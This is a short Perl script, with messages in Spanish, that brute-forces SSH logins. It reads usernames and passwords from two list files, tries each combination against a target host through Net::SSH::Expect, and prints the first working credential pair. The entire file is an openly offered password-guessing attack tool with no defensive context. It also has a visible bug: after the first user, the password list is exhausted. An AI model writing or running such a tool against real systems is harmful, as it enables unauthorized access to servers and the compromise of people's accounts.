use Net::SSH::Expect;

my $user_list = $ARGV[0];
my $password_list = $ARGV[1];
my $host = $ARGV[2];
my $ssh;

open(USERS, "$user_list") or die $!;
open(PASSWORDS, "$password_list") or die $!;
foreach $user (<USERS>){
  chomp $user;
  foreach $password (<PASSWORDS>){
    chomp $password;
    print "Probando Usuario: $user + contraseña: $password en host: $host\n";
    my $ssh = Net::SSH::Expect -> new (
          host => "$host",
          password => "$password",
          user => "$user",
          raw_pty => 1
          );
    if(index($ssh -> login(), "$user@") != -1){
      print "Combinación válida: $user:$password\n";
      $ssh -> close();
      die;
    }
  }
}
close(USERS);
close(PASSWORDS);
die "No hubo exito en el ataque";
